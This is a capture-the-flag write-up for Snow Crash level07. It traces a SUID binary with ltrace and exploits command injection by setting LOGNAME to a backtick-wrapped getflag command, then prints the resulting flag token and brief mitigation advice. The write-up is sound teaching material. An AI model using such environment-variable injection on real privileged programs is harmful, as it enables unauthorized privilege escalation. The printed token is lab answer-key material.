# Level07 - Snow Crash Exploit

## Description

Upon logging in as `level07`, there is a single SUID executable in the home directory:

```
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

Running the binary simply prints its own name:

```bash
./level07
# Output: level07
```

## Analysis

Using `ltrace` to trace library calls reveals the following:

```
getenv("LOGNAME") = "level07"
asprintf(...)
system("/bin/echo level07 "level07" ...)
```

The program retrieves the value of the `LOGNAME` environment variable and passes it to `/bin/echo` via `system()`. This introduces a command injection vulnerability if the environment variable contains shell metacharacters.

## Exploitation

By setting the `LOGNAME` environment variable to a command substitution, we can execute arbitrary commands as the `flag07` user:

```bash
export LOGNAME="`getflag`"
./level07
```

**Output:**
```
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## Mitigation

- Never pass unsanitized environment variables or user input to system calls.
- Use safe APIs or sanitize input before using it in shell